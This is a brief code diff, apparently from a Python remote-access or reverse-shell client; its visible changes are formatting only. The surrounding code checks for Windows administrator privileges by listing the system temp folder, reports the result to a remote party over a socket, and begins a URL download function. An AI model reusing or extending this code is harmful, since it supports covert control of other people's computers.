@@ -26,9 +26,10 @@ def reliable_recv(sock):
         except ValueError:
             continue
 
+
 def is_admin(sock):
     try:
-        temp_dir =os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'),'temp')
+        temp_dir = os.path.join(os.environ.get("SystemRoot", "C:\\Windows"), "temp")
         os.listdir(temp_dir)
         admin = "[!!] Administrator Privileges"
     except PermissionError:
@@ -36,6 +37,7 @@ def is_admin(sock):
     except Exception as e:
         admin = f"[!!] Ошибка при проверке привилегий: {e}"
     reliable_send(admin, sock)
+
 
 def download(url):
     try:
